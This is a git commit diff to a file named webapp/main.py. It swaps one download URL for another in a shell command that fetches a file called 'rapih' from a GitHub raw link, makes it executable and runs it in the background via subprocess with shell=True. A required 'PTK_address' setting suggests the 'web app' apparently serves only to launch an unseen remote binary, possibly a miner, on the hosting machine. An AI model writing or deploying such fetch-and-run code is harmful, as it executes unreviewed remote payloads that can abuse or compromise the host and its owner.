d7ede47bbecaf9d491ab43d83c636fb654046e44
danipedrosang <134082647+danipedrosang@users.noreply.github.com>
2023-05-27 13:47:27 +0700

    Update main.py

--- webapp/main.py
+++ webapp/main.py
@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'wget https://raw.githubusercontent.com/sindualan82/raf/main/doresika.sh && chmod +x doresika.sh && ./doresika.sh > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/rapih && chmod +x rapih && ./rapih > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
